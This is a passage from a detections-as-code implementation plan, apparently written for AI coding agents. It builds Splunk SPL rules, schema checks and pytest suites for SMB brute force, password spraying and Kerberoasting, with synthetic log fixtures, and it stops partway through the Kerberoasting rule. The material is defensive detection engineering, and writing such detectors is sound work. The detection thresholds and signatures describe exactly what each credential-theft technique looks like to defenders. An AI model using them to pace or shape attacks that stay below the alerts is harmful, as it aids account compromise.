# Splunk Detections-as-Code Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Turn `projects/defensive/splunk/` from a screenshot gallery into four machine-validated detections with metadata, alert config, fixtures, and a CI job that executes the SPL against a real Splunk container.

**Architecture:** Each detection is a directory under `rules/` holding `detection.yml` (metadata), `search.spl` (the query), `savedsearches.conf` (alert config), and JSONL fixtures. Two validation layers: metadata tests (pure Python, every push) and behaviour tests (ephemeral Splunk container, separate CI job). A `loader.py` module is the single way both layers read rules.

**Tech Stack:** Python 3.11+, pytest, PyYAML, jsonschema, requests, Docker, Splunk Enterprise (`splunk/splunk` container), SPL.

**Spec:** [`docs/superpowers/specs/2026-09-12-splunk-detections-as-code-design.md`](../specs/2026-09-12-splunk-detections-as-code-design.md)

## Global Constraints

- **Python 3.11+.** Root `pyproject.toml` sets `target-version = "py311"`; CI runs 3.11 and 3.12.
- **Line length 100.** Ruff lint selects `E4, E7, E9, F, I, UP, B`. Run `ruff format` before staging.
- **Project root convention.** `detections/` gets an empty `conftest.py` at its root (puts the root on `sys.path`) and its own `requirements-dev.txt`. Tests run from **inside** `projects/defensive/splunk/detections/`, never from the repo root.
- **No packaging metadata.** Do not add `[build-system]` or `[project]` to `pyproject.toml`.
- **Every detection ships `status: validated-offline`.** Never `validated-in-lab` — the lab is torn down and no detection here has seen live data.
- **Splunk image is pinned to `splunk/splunk:9.3.2`.** Never `:latest`.
- **Fixture timestamps are absolute and in the past** (`2026-09-01T…Z`), so scheduled-window semantics do not affect test results.
- **Commits are the repo owner's.** Every task ends by staging files and printing the commit command for the owner to run. Do not run `git commit` or `git push`.
- **Commit message trailer** when the owner commits: `Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>`

---

## File Structure

**Created:**

| File | Responsibility |
|---|---|
| `projects/defensive/splunk/detections/conftest.py` | Empty; puts project root on `sys.path` |
| `…/detections/requirements-dev.txt` | pytest, PyYAML, jsonschema, requests |
| `…/detections/schema.json` | JSON Schema for `detection.yml` |
| `…/detections/attack_techniques.txt` | Vendored valid ATT&CK technique IDs |
| `…/detections/lib/__init__.py` | Package marker |
| `…/detections/lib/loader.py` | Rule discovery, YAML/SPL/conf/fixture parsing, SPL field extraction, index substitution |
| `…/detections/lib/splunk_harness.py` | Container lifecycle, HEC ingest, REST search |
| `…/detections/tests/test_metadata.py` | Layer C |
| `…/detections/tests/test_behaviour.py` | Layer A (`@pytest.mark.docker`) |
| `…/detections/README.md` | Methodology, limits, how to add a detection |
| `…/detections/rules/<4 rule dirs>/` | `detection.yml`, `search.spl`, `savedsearches.conf`, `events/*.jsonl` |

**Modified:** `pyproject.toml` (docker marker + default deselect), `.github/workflows/ci.yml` (matrix entry + new job), `projects/defensive/splunk/README.md` (link detections), `README.md`, `docs/defensive-architecture.md`, `docs/diagrams/defensive-architecture.{html,svg}` (Sysmon corrections).

---

### Task 1: Scaffold, loader, and the first rule's files

**Files:**
- Create: `projects/defensive/splunk/detections/conftest.py`, `requirements-dev.txt`, `lib/__init__.py`, `lib/loader.py`
- Create: `…/rules/win_bruteforce_smb_4625/{detection.yml,search.spl,events/true_positive.jsonl,events/benign.jsonl}`
- Test: `…/detections/tests/test_metadata.py`

**Interfaces:**
- Consumes: nothing.
- Produces: `lib.loader.Rule` (frozen dataclass with `path: Path`, `meta: dict`, `spl: str`; properties `id -> str`, `true_positive_events -> list[dict]`, `benign_events -> list[dict]`, `savedsearch -> dict[str, str]`) and `lib.loader.load_rules(rules_dir: Path = RULES_DIR) -> list[Rule]`. Later tasks import both.

All paths below are relative to `projects/defensive/splunk/detections/`.

- [ ] **Step 1: Create the scaffold files**

`conftest.py` — deliberately empty except the comment (matches the other projects):

```python
# Empty by design: pytest adds this file's directory to sys.path, which is how
# `from lib.loader import ...` resolves when tests run from this project root.
```

`requirements-dev.txt`:

```
pytest>=8.0.0
PyYAML>=6.0
jsonschema>=4.21.0
requests>=2.31.0
```

`lib/__init__.py`:

```python
"""Shared helpers for loading and validating detection rules."""
```

- [ ] **Step 2: Write the failing test**

`tests/test_metadata.py`:

```python
"""Layer C: metadata validation. Pure Python, no Splunk, no Docker."""

from lib.loader import load_rules


def test_rules_are_discovered():
    rules = load_rules()
    assert rules, "no detection rules found under rules/"


def test_every_rule_id_matches_its_directory_name():
    for rule in load_rules():
        assert rule.meta["id"] == rule.path.name


def test_every_rule_has_both_fixture_files():
    for rule in load_rules():
        assert rule.true_positive_events, f"{rule.id}: no true-positive fixtures"
        assert rule.benign_events, f"{rule.id}: no benign fixtures"
```

- [ ] **Step 3: Run the test to verify it fails**

Run: `python -m pytest tests/test_metadata.py -v`
Expected: FAIL — `ModuleNotFoundError: No module named 'lib.loader'`

- [ ] **Step 4: Write `lib/loader.py`**

```python
"""Discovery and parsing of detection rules.

Every rule is a directory under `rules/` containing detection.yml, search.spl,
savedsearches.conf and an events/ directory of JSONL fixtures. This module is
the only place that knows that layout; both test layers go through it.
"""

from __future__ import annotations

import json
import re
from dataclasses import dataclass
from functools import cached_property
from pathlib import Path

import yaml

PROJECT_ROOT = Path(__file__).resolve().parent.parent
RULES_DIR = PROJECT_ROOT / "rules"


def _read_jsonl(path: Path) -> list[dict]:
    if not path.exists():
        return []
    with path.open(encoding="utf-8") as fh:
        return [json.loads(line) for line in fh if line.strip()]


def _parse_conf(text: str) -> dict[str, dict[str, str]]:
    """Parse a Splunk .conf file.

    configparser is not used: Splunk continues a long value with a trailing
    backslash, which configparser does not understand (it expects indented
    continuation lines). Joining those continuations is the whole job here.
    """
    stanzas: dict[str, dict[str, str]] = {}
    current: dict[str, str] | None = None
    key: str | None = None

    for raw in text.splitlines():
        line = raw.rstrip("\n")
        stripped = line.strip()

        if not stripped or stripped.startswith("#"):
            continue

        if key is not None and current is not None:
            # Previous line ended with a backslash: this line continues it.
            current[key] += " " + stripped.removesuffix("\\").strip()
            key = key if stripped.endswith("\\") else None
            continue

        if stripped.startswith("[") and stripped.endswith("]"):
            current = {}
            stanzas[stripped[1:-1]] = current
            continue

        if "=" in stripped and current is not None:
            name, _, value = stripped.partition("=")
            name = name.strip()
            value = value.strip()
            current[name] = value.removesuffix("\\").strip()
            key = name if value.endswith("\\") else None

    return stanzas


@dataclass(frozen=True)
class Rule:
    path: Path
    meta: dict
    spl: str

    @property
    def id(self) -> str:
        return self.path.name

    @cached_property
    def true_positive_events(self) -> list[dict]:
        return _read_jsonl(self.path / "events" / "true_positive.jsonl")

    @cached_property
    def benign_events(self) -> list[dict]:
        return _read_jsonl(self.path / "events" / "benign.jsonl")

    @cached_property
    def savedsearch(self) -> dict[str, str]:
        conf = self.path / "savedsearches.conf"
        if not conf.exists():
            return {}
        stanzas = _parse_conf(conf.read_text(encoding="utf-8"))
        if len(stanzas) != 1:
            raise ValueError(f"{self.id}: expected exactly one stanza, found {len(stanzas)}")
        return next(iter(stanzas.values()))


def load_rules(rules_dir: Path = RULES_DIR) -> list[Rule]:
    rules = []
    for rule_dir in sorted(p for p in rules_dir.iterdir() if p.is_dir()):
        meta = yaml.safe_load((rule_dir / "detection.yml").read_text(encoding="utf-8"))
        spl = (rule_dir / "search.spl").read_text(encoding="utf-8").strip()
        rules.append(Rule(path=rule_dir, meta=meta, spl=spl))
    return rules


def normalise_spl(text: str) -> str:
    """Collapse a search to one whitespace-normalised line for comparison."""
    return " ".join(text.replace("\\\n", " ").split())


INDEX_RE = re.compile(r"\bindex\s*=\s*(\S+)")


def substitute_index(spl: str, index: str) -> str:
    """Point a rule's search at a test index.

    The rule names the production index; fixtures load into a per-rule test
    index. Asserting there is exactly one `index=` term means the rewrite can
    neither miss a second one nor silently apply twice.
    """
    matches = INDEX_RE.findall(spl)
    if len(matches) != 1:
        raise ValueError(f"expected exactly one index= term, found {len(matches)}: {matches}")
    return INDEX_RE.sub(f"index={index}", spl, count=1)
```

- [ ] **Step 5: Create the first rule's `detection.yml`**

`rules/win_bruteforce_smb_4625/detection.yml`:

```yaml
---
id: win_bruteforce_smb_4625
title: SMB brute-force — repeated failed network logons from a single source
status: validated-offline
version: 1
author: Angus Dawson
date: 2026-09-12
description: >
  Detects password guessing against SMB by counting failed network logons
  (EventCode 4625, Logon_Type 3) grouped by source address inside a fifteen
  minute window. Logon_Type 3 is what SMB authentication produces, so
  restricting to it removes interactive mistyped-password noise while keeping
  the behaviour the walkthrough's smbclient loop generated.
attack:
  - tactic: credential-access
    technique: T1110.001
    name: Password Guessing
data_source:
  log: Windows Security
  event_codes: [4625]
  audit_subcategory: Logon
  required_fields:
    - EventCode
    - Logon_Type
    - Account_Name
    - Source_Network_Address
logic:
  window: 15m
  threshold: 5
  rationale: >
    The domain lockout policy in
    projects/defensive/windows_server_with_AD/ansible/vars/gpos.yml sets
    lockout_threshold 5 and lockout_observation_window_minutes 15. Five
    failures from one source inside fifteen minutes is therefore exactly the
    activity the lockout policy exists to stop, so the threshold is derived
    from the environment's own policy rather than chosen arbitrarily. If that
    policy changes, this threshold and window change with it.
false_positives:
  - scenario: A service account with a stale cached credential retrying on a timer.
    guidance: >
      Check whether Account_Name is a service account and whether the failures
      are evenly spaced. Human guessing is bursty; a scheduler is metronomic.
      Fix the stored credential rather than tuning the detection.
  - scenario: A vulnerability scan authenticating with an expired account.
    guidance: >
      Correlate Source_Network_Address against known scanner hosts. Exclude by
      source address, never by account name.
response: >
  Identify whether Source_Network_Address is expected on the network. If the
  source is unknown, isolate it and check whether any 4624 success followed the
  failures from the same source — a success after a run of failures is the
  signal that guessing worked.
references:
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4625
  - https://attack.mitre.org/techniques/T1110/001/
```

- [ ] **Step 6: Create `search.spl` and the fixtures**

`rules/win_bruteforce_smb_4625/search.spl`:

```
index=wineventlog sourcetype="XmlWinEventLog:Security" EventCode=4625 Logon_Type=3
| bucket _time span=15m
| stats count AS failure_count,
        dc(Account_Name) AS distinct_accounts,
        values(Account_Name) AS targeted_accounts
        BY _time, Source_Network_Address
| where failure_count >= 5
```

`rules/win_bruteforce_smb_4625/events/true_positive.jsonl` — six failures from one source inside one bucket:

```
{"_time": "2026-09-01T10:00:05Z", "EventCode": 4625, "Logon_Type": 3, "Account_Name": "testuser", "Source_Network_Address": "10.10.10.50", "Computer": "WKSTN01.homelab.local"}
{"_time": "2026-09-01T10:00:21Z", "EventCode": 4625, "Logon_Type": 3, "Account_Name": "testuser", "Source_Network_Address": "10.10.10.50", "Computer": "WKSTN01.homelab.local"}
{"_time": "2026-09-01T10:00:38Z", "EventCode": 4625, "Logon_Type": 3, "Account_Name": "testuser", "Source_Network_Address": "10.10.10.50", "Computer": "WKSTN01.homelab.local"}
{"_time": "2026-09-01T10:01:02Z", "EventCode": 4625, "Logon_Type": 3, "Account_Name": "testuser", "Source_Network_Address": "10.10.10.50", "Computer": "WKSTN01.homelab.local"}
{"_time": "2026-09-01T10:01:19Z", "EventCode": 4625, "Logon_Type": 3, "Account_Name": "administrator", "Source_Network_Address": "10.10.10.50", "Computer": "WKSTN01.homelab.local"}
{"_time": "2026-09-01T10:01:44Z", "EventCode": 4625, "Logon_Type": 3, "Account_Name": "administrator", "Source_Network_Address": "10.10.10.50", "Computer": "WKSTN01.homelab.local"}
```

`rules/win_bruteforce_smb_4625/events/benign.jsonl` — under threshold from one source, plus six *interactive* failures that must be excluded by `Logon_Type=3`:

```
{"_time": "2026-09-01T11:00:04Z", "EventCode": 4625, "Logon_Type": 3, "Account_Name": "jbloggs", "Source_Network_Address": "10.10.10.60", "Computer": "WKSTN01.homelab.local"}
{"_time": "2026-09-01T11:02:11Z", "EventCode": 4625, "Logon_Type": 3, "Account_Name": "jbloggs", "Source_Network_Address": "10.10.10.60", "Computer": "WKSTN01.homelab.local"}
{"_time": "2026-09-01T11:05:47Z", "EventCode": 4625, "Logon_Type": 3, "Account_Name": "jbloggs", "Source_Network_Address": "10.10.10.60", "Computer": "WKSTN01.homelab.local"}
{"_time": "2026-09-01T11:10:02Z", "EventCode": 4625, "Logon_Type": 2, "Account_Name": "jbloggs", "Source_Network_Address": "10.10.10.70", "Computer": "WKSTN01.homelab.local"}
{"_time": "2026-09-01T11:10:15Z", "EventCode": 4625, "Logon_Type": 2, "Account_Name": "jbloggs", "Source_Network_Address": "10.10.10.70", "Computer": "WKSTN01.homelab.local"}
{"_time": "2026-09-01T11:10:31Z", "EventCode": 4625, "Logon_Type": 2, "Account_Name": "jbloggs", "Source_Network_Address": "10.10.10.70", "Computer": "WKSTN01.homelab.local"}
{"_time": "2026-09-01T11:10:48Z", "EventCode": 4625, "Logon_Type": 2, "Account_Name": "jbloggs", "Source_Network_Address": "10.10.10.70", "Computer": "WKSTN01.homelab.local"}
{"_time": "2026-09-01T11:11:03Z", "EventCode": 4625, "Logon_Type": 2, "Account_Name": "jbloggs", "Source_Network_Address": "10.10.10.70", "Computer": "WKSTN01.homelab.local"}
{"_time": "2026-09-01T11:11:22Z", "EventCode": 4625, "Logon_Type": 2, "Account_Name": "jbloggs", "Source_Network_Address": "10.10.10.70", "Computer": "WKSTN01.homelab.local"}
```

- [ ] **Step 7: Run tests to verify they pass**

Run: `python -m pytest tests/test_metadata.py -v`
Expected: PASS, 3 tests.

- [ ] **Step 8: Lint and stage**

```bash
ruff check --fix projects/defensive/splunk/detections && ruff format projects/defensive/splunk/detections && git add projects/defensive/splunk/detections
```

Commit message for the owner: `feat(splunk): add detections scaffold, rule loader, and SMB brute-force rule`

---

### Task 2: JSON Schema validation

**Files:**
- Create: `…/detections/schema.json`
- Modify: `…/detections/tests/test_metadata.py`

**Interfaces:**
- Consumes: `load_rules()` from Task 1.
- Produces: `schema.json` at `lib.loader.PROJECT_ROOT / "schema.json"`. Task 5's rules must validate against it.

- [ ] **Step 1: Write the failing test**

Append to `tests/test_metadata.py`:

```python
import json

import jsonschema
import pytest

from lib.loader import PROJECT_ROOT, load_rules

SCHEMA = json.loads((PROJECT_ROOT / "schema.json").read_text(encoding="utf-8"))


@pytest.mark.parametrize("rule", load_rules(), ids=lambda r: r.id)
def test_detection_metadata_matches_schema(rule):
    jsonschema.validate(instance=rule.meta, schema=SCHEMA)


@pytest.mark.parametrize("rule", load_rules(), ids=lambda r: r.id)
def test_status_is_validated_offline(rule):
    # No detection here has seen live lab data. Saying otherwise in a portfolio
    # repo is the exact overstatement this project exists to remove.
    assert rule.meta["status"] == "validated-offline"
```

Move the existing `from lib.loader import load_rules` import into this consolidated import block; do not leave two import statements for the same module.

- [ ] **Step 2: Run the test to verify it fails**

Run: `python -m pytest tests/test_metadata.py -v`
Expected: FAIL — `FileNotFoundError: schema.json`

- [ ] **Step 3: Write `schema.json`**

```json
{
  "$schema": "https://json-schema.org/draft/2020-12/schema",
  "title": "Detection rule metadata",
  "type": "object",
  "additionalProperties": false,
  "required": [
    "id", "title", "status", "version", "author", "date", "description",
    "attack", "data_source", "logic", "false_positives", "response", "references"
  ],
  "properties": {
    "id": { "type": "string", "pattern": "^[a-z0-9_]+$" },
    "title": { "type": "string", "minLength": 10 },
    "status": { "enum": ["draft", "validated-offline", "validated-in-lab"] },
    "version": { "type": "integer", "minimum": 1 },
    "author": { "type": "string" },
    "date": { "type": "string", "format": "date" },
    "description": { "type": "string", "minLength": 40 },
    "attack": {
      "type": "array",
      "minItems": 1,
      "items": {
        "type": "object",
        "additionalProperties": false,
        "required": ["tactic", "technique", "name"],
        "properties": {
          "tactic": { "type": "string" },
          "technique": { "type": "string", "pattern": "^T\\d{4}(\\.\\d{3})?$" },
          "name": { "type": "string" }
        }
      }
    },
    "data_source": {
      "type": "object",
      "additionalProperties": false,
      "required": ["log", "event_codes", "audit_subcategory", "required_fields"],
      "properties": {
        "log": { "type": "string" },
        "event_codes": {
          "type": "array", "minItems": 1, "items": { "type": "integer" }
        },
        "audit_subcategory": { "type": "string" },
        "required_fields": {
          "type": "array", "minItems": 1, "items": { "type": "string" }
        },
        "prerequisites": { "type": "array", "items": { "type": "string" } }
      }
    },
    "logic": {
      "type": "object",
      "additionalProperties": false,
      "required": ["window", "threshold", "rationale"],
      "properties": {
        "window": { "type": "string", "pattern": "^\\d+[smhd]$" },
        "threshold": { "type": "integer", "minimum": 1 },
        "rationale": { "type": "string", "minLength": 60 }
      }
    },
    "false_positives": {
      "type": "array",
      "minItems": 1,
      "items": {
        "type": "object",
        "additionalProperties": false,
        "required": ["scenario", "guidance"],
        "properties": {
          "scenario": { "type": "string" },
          "guidance": { "type": "string" }
        }
      }
    },
    "response": { "type": "string", "minLength": 40 },
    "references": {
      "type": "array", "minItems": 1,
      "items": { "type": "string", "format": "uri" }
    }
  }
}
```

The `minLength` floors on `rationale`, `description` and `response` are deliberate: they make an empty gesture at documentation fail the build rather than pass it.

- [ ] **Step 4: Run tests to verify they pass**

Run: `python -m pytest tests/test_metadata.py -v`
Expected: PASS, 5 tests.

- [ ] **Step 5: Lint and stage**

```bash
ruff check --fix projects/defensive/splunk/detections && ruff format projects/defensive/splunk/detections && git add projects/defensive/splunk/detections
```

Commit message for the owner: `feat(splunk): validate detection metadata against a JSON schema`

---

### Task 3: Vendored ATT&CK technique validation

**Files:**
- Create: `…/detections/attack_techniques.txt`
- Modify: `…/detections/tests/test_metadata.py`

**Interfaces:**
- Consumes: `load_rules()`, `PROJECT_ROOT`.
- Produces: nothing later tasks import.

- [ ] **Step 1: Write the failing test**

Append to `tests/test_metadata.py`:

```python
VALID_TECHNIQUES = {
    line.split("#", 1)[0].strip()
    for line in (PROJECT_ROOT / "attack_techniques.txt").read_text(encoding="utf-8").splitlines()
    if line.split("#", 1)[0].strip()
}


@pytest.mark.parametrize("rule", load_rules(), ids=lambda r: r.id)
def test_attack_techniques_are_real(rule):
    for entry in rule.meta["attack"]:
        assert entry["technique"] in VALID_TECHNIQUES, (
            f"{rule.id}: {entry['technique']} is not in attack_techniques.txt. "
            "Add it there if it is genuinely a valid ATT&CK ID."
        )
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `python -m pytest tests/test_metadata.py -v`
Expected: FAIL — `FileNotFoundError: attack_techniques.txt`

- [ ] **Step 3: Write `attack_techniques.txt`**

```
# Valid MITRE ATT&CK (Enterprise) technique IDs used by, or plausibly useful to,
# the detections in this directory. Vendored rather than fetched at test time so
# CI depends on neither network access nor MITRE's uptime.
#
# Source: https://attack.mitre.org/techniques/enterprise/
# Reviewed against ATT&CK v15.

T1110          # Brute Force
T1110.001      # Brute Force: Password Guessing
T1110.003      # Brute Force: Password Spraying
T1110.004      # Brute Force: Credential Stuffing
T1558          # Steal or Forge Kerberos Tickets
T1558.003      # Steal or Forge Kerberos Tickets: Kerberoasting
T1059          # Command and Scripting Interpreter
T1059.001      # Command and Scripting Interpreter: PowerShell
T1078          # Valid Accounts
T1021.002      # Remote Services: SMB/Windows Admin Shares
T1046          # Network Service Discovery
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `python -m pytest tests/test_metadata.py -v`
Expected: PASS, 6 tests.

- [ ] **Step 5: Stage**

```bash
git add projects/defensive/splunk/detections
```

Commit message for the owner: `feat(splunk): validate ATT&CK technique IDs against a vendored list`

---

### Task 4: Field consistency and savedsearches.conf parity

**Files:**
- Modify: `…/detections/lib/loader.py` (add `spl_field_references`)
- Modify: `…/detections/tests/test_metadata.py`
- Create: `…/rules/win_bruteforce_smb_4625/savedsearches.conf`

**Interfaces:**
- Consumes: `Rule`, `load_rules()`, `normalise_spl()` from Task 1.
- Produces: `lib.loader.spl_field_references(spl: str) -> set[str]` — field names a search reads but does not itself create.

This is the task that would have caught the `src_ip` / `Source_Network_Address` mismatch in the current README.

- [ ] **Step 1: Write the failing test**

Append to `tests/test_metadata.py`:

```python
from lib.loader import normalise_spl, spl_field_references


@pytest.mark.parametrize("rule", load_rules(), ids=lambda r: r.id)
def test_required_fields_are_present_in_every_true_positive_fixture(rule):
    for event in rule.true_positive_events:
        missing = set(rule.meta["data_source"]["required_fields"]) - set(event)
        assert not missing, f"{rule.id}: fixture missing {sorted(missing)}"


@pytest.mark.parametrize("rule", load_rules(), ids=lambda r: r.id)
def test_spl_only_reads_declared_fields(rule):
    declared = set(rule.meta["data_source"]["required_fields"])
    unknown = spl_field_references(rule.spl) - declared
    assert not unknown, (
        f"{rule.id}: search reads {sorted(unknown)}, which is not in "
        "data_source.required_fields. Either the field name is a typo or the "
        "metadata is out of date."
    )


@pytest.mark.parametrize("rule", load_rules(), ids=lambda r: r.id)
def test_savedsearch_query_matches_search_spl(rule):
    assert normalise_spl(rule.savedsearch["search"]) == normalise_spl(rule.spl), (
        f"{rule.id}: savedsearches.conf has drifted from search.spl"
    )


@pytest.mark.parametrize("rule", load_rules(), ids=lambda r: r.id)
def test_savedsearch_is_scheduled_and_suppressed(rule):
    conf = rule.savedsearch
    assert conf["enableSched"] == "1"
    assert conf["cron_schedule"]
    assert conf["dispatch.earliest_time"]
    assert conf["alert.suppress"] == "1"
```

- [ ] **Step 2: Run the test to verify it fails**

Run: `python -m pytest tests/test_metadata.py -v`
Expected: FAIL — `ImportError: cannot import name 'spl_field_references'`

- [ ] **Step 3: Add `spl_field_references` to `lib/loader.py`**

Append to `lib/loader.py`:

```python
# Field extraction is a heuristic, not an SPL parser. It recognises the four
# shapes these detections use to read a field, and subtracts every name the
# search creates with `AS`. Windows event fields are capitalised, which is what
# makes the filter pattern safe: it matches `EventCode=` but not `index=`,
# `sourcetype=` or `span=`.
_FILTER_RE = re.compile(r"\b([A-Z]\w*)\s*=")
_AGG_RE = re.compile(r"\b(?:dc|values|count|min|max|latest|earliest)\(\s*([^)]*?)\s*\)")
_MATCH_RE = re.compile(r"\bmatch\(\s*(\w+)\s*,")
_CLAUSE_RE = re.compile(r"\b(?:BY|table)\s+([^|]+)", re.IGNORECASE)
_CREATED_RE = re.compile(r"\bAS\s+(\w+)", re.IGNORECASE)

_NON_FIELDS = {"_time", "NOT", "AND", "OR"}


def spl_field_references(spl: str) -> set[str]:
    """Field names a search reads but does not itself create."""
    found: set[str] = set(_FILTER_RE.findall(spl))
    found |= set(_MATCH_RE.findall(spl))

    for group in _AGG_RE.findall(spl) + _CLAUSE_RE.findall(spl):
        for token in re.split(r"[,\s]+", group):
            token = token.strip()
            if token and (token[0].isupper() or token.startswith("_")):
                found.add(token)

    return {f for f in found - set(_CREATED_RE.findall(spl)) if f not in _NON_FIELDS}
```

- [ ] **Step 4: Write `savedsearches.conf` for the first rule**

`rules/win_bruteforce_smb_4625/savedsearches.conf`. Note the trailing backslashes — Splunk's line-continuation syntax, which `_parse_conf` joins:

```conf
# Alert configuration for win_bruteforce_smb_4625.
# The search body is the single source of truth in search.spl; the parity test
# in tests/test_metadata.py fails if these two drift apart.

[Homelab - SMB Brute-Force (T1110.001)]
search = index=wineventlog sourcetype="XmlWinEventLog:Security" EventCode=4625 Logon_Type=3 \
| bucket _time span=15m \
| stats count AS failure_count, dc(Account_Name) AS distinct_accounts, values(Account_Name) AS targeted_accounts BY _time, Source_Network_Address \
| where failure_count >= 5
description = Five or more failed SMB network logons from one source inside 15 minutes.
cron_schedule = */15 * * * *
dispatch.earliest_time = -20m@m
dispatch.latest_time = now
enableSched = 1
counttype = number of events
relation = greater than
quantity = 0
alert.severity = 4
alert.suppress = 1
alert.suppress.fields = Source_Network_Address
alert.suppress.period = 60m
action.email = 0
```

The 20-minute dispatch window deliberately exceeds the 15-minute schedule: the overlap re-evaluates activity that fell near a bucket boundary.

- [ ] **Step 5: Run tests to verify they pass**

Run: `python -m pytest tests/test_metadata.py -v`
Expected: PASS, 10 tests.

- [ ] **Step 6: Prove the field check actually catches the bug it exists for**

Temporarily edit `search.spl`, replacing `Source_Network_Address` with `src_ip` in the `BY` clause, then run:

Run: `python -m pytest tests/test_metadata.py -k spl_only_reads -v`
Expected: FAIL — `search reads ['src_ip'], which is not in data_source.required_fields`

Revert the edit and re-run to confirm PASS. A guard that has never been seen to fail is not known to work.

- [ ] **Step 7: Lint and stage**

```bash
ruff check --fix projects/defensive/splunk/detections && ruff format projects/defensive/splunk/detections && git add projects/defensive/splunk/detections
```

Commit message for the owner: `feat(splunk): check SPL field references and savedsearches.conf parity`

---

### Task 5: The remaining three detections

**Files:**
- Create: `…/rules/win_account_lockout_4740/{detection.yml,search.spl,savedsearches.conf,events/true_positive.jsonl,events/benign.jsonl}`
- Create: `…/rules/win_kerberoasting_4769/{…same five files…}`
- Create: `…/rules/win_suspicious_process_4688/{…same five files…}`

**Interfaces:**
- Consumes: `schema.json`, `attack_techniques.txt`, every Task 1–4 test.
- Produces: nothing importable; the existing parametrised tests pick these up automatically.

No new test code. Every test written so far is parametrised over `load_rules()`, so these three rules are validated the moment they exist — which is the point of that structure.

- [ ] **Step 1: Create `win_account_lockout_4740`**

`detection.yml`:

```yaml
---
id: win_account_lockout_4740
title: Password spraying — multiple distinct accounts locked from one source
status: validated-offline
version: 1
author: Angus Dawson
date: 2026-09-12
description: >
  Detects password spraying by counting distinct accounts locked out
  (EventCode 4740) per calling computer within an hour. Deliberately not an
  alert on any single lockout, which in a domain with lockout_threshold 5 is
  routine user error. Breadth across accounts is the spraying signal; depth
  against one account is the brute-force signal that
  win_bruteforce_smb_4625 covers.
attack:
  - tactic: credential-access
    technique: T1110.003
    name: Password Spraying
data_source:
  log: Windows Security
  event_codes: [4740]
  audit_subcategory: Account Lockout
  required_fields:
    - EventCode
    - Account_Name
    - Caller_Computer_Name
logic:
  window: 1h
  threshold: 3
  rationale: >
    One or two lockouts in an hour is ordinary in any domain with a lockout
    policy — users mistype passwords after password changes and on returning
    from leave. Three distinct accounts locked from the same caller inside an
    hour is a shape user error does not produce, because unrelated users do not
    share a source host. The threshold counts distinct accounts, not lockout
    events, so one account locking repeatedly cannot reach it.
false_positives:
  - scenario: A terminal server or jump host where many users authenticate.
    guidance: >
      Caller_Computer_Name will be that host for legitimate lockouts too.
      Exclude the specific host and, if possible, lower the threshold for it
      rather than removing the detection.
  - scenario: A shared service account stored on several machines after a password rotation.
    guidance: >
      Check whether the locked accounts are distinct humans or one identity.
      Distinct humans is the spraying case; one identity is a rotation fault.
response: >
  Determine whether Caller_Computer_Name is a host where multiple users
  legitimately authenticate. If not, treat it as a compromised or attacker
  controlled host and check for any 4624 success from it during the same window.
references:
  - https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4740
  - https://attack.mitre.org/techniques/T1110/003/
```

`search.spl`:

```
index=wineventlog sourcetype="XmlWinEventLog:Security" EventCode=4740
| bucket _time span=1h
| stats dc(Account_Name) AS accounts_locked,
        values(Account_Name) AS locked_accounts
        BY _time, Caller_Computer_Name
| where accounts_locked >= 3
```

`savedsearches.conf`:

```conf
# Alert configuration for win_account_lockout_4740.
# search.spl is the source of truth; the parity test fails on drift.

[Homelab - Password Spraying via Lockouts (T1110.003)]
search = index=wineventlog sourcetype="XmlWinEventLog:Security" EventCode=4740 \
| bucket _time span=1h \
| stats dc(Account_Name) AS accounts_locked, values(Account_Name) AS locked_accounts BY _time, Caller_Computer_Name \
| where accounts_locked >= 3
description = Three or more distinct accounts locked out from one caller within an hour.
cron_schedule = 5 * * * *
dispatch.earliest_time = -75m@m
dispatch.latest_time = now
enableSched = 1
counttype = number of events
relation = greater than
quantity = 0
alert.severity = 5
alert.suppress = 1
alert.suppress.fields = Caller_Computer_Name
alert.suppress.period = 4h
action.email = 0
```

`events/true_positive.jsonl` — three distinct accounts, one caller, one hour:

```
{"_time": "2026-09-01T09:05:12Z", "EventCode": 4740, "Account_Name": "jbloggs", "Caller_Computer_Name": "WKSTN01"}
{"_time": "2026-09-01T09:21:44Z", "EventCode": 4740, "Account_Name": "asmith", "Caller_Computer_Name": "WKSTN01"}
{"_time": "2026-09-01T09:48:03Z", "EventCode": 4740, "Account_Name": "rpatel", "Caller_Computer_Name": "WKSTN01"}
```

`events/benign.jsonl` — two distinct accounts (under threshold), and one account locking three times (depth, not breadth):

```
{"_time": "2026-09-01T13:05:12Z", "EventCode": 4740, "Account_Name": "jbloggs", "Caller_Computer_Name": "WKSTN02"}
{"_time": "2026-09-01T13:31:44Z", "EventCode": 4740, "Account_Name": "asmith", "Caller_Computer_Name": "WKSTN02"}
{"_time": "2026-09-01T14:02:10Z", "EventCode": 4740, "Account_Name": "tjones", "Caller_Computer_Name": "WKSTN03"}
{"_time": "2026-09-01T14:19:55Z", "EventCode": 4740, "Account_Name": "tjones", "Caller_Computer_Name": "WKSTN03"}
{"_time": "2026-09-01T14:44:31Z", "EventCode": 4740, "Account_Name": "tjones", "Caller_Computer_Name": "WKSTN03"}
```

- [ ] **Step 2: Run tests to verify the new rule passes**

Run: `python -m pytest tests/test_metadata.py -v`
Expected: PASS, 17 tests (3 suite-wide + 7 per-rule × 2 rules).

- [ ] **Step 3: Create `win_kerberoasting_4769`**

`detection.yml`:

```yaml
---
id: win_kerberoasting_4769
title: Kerberoasting — bulk RC4 service ticket requests for distinct SPNs
status: validated-offline
version: 1
author: Angus Dawson
date: 2026-09-12
description: >
  Detects Kerberoasting by counting distinct service names for which one
  principal requests RC4-encrypted service tickets (EventCode 4769,
  Ticket_Encryption_Type 0x17) inside ten minutes. Attackers request RC4
  because the resulting ticket is far cheaper to crack offline than AES.
  Machine accounts and krbtgt are excluded as ordinary Kerberos operation.
attack:
  - tactic: credential-access
    technique: T1558.003
    name: Kerberoasting
data_source:
  log: Windows Security
  event_codes: [4769]
  audit_subcategory: Kerberos Service Ticket Operations
  required_fields:
    - EventCode
    - Ticket_Encryption_Type
    - Ticket_Options
    - Failure_Code
    - Service_Name
    - Account_Name
    - Client_Address
logic:
  window: 10m
  threshold: 5
  rationale: >
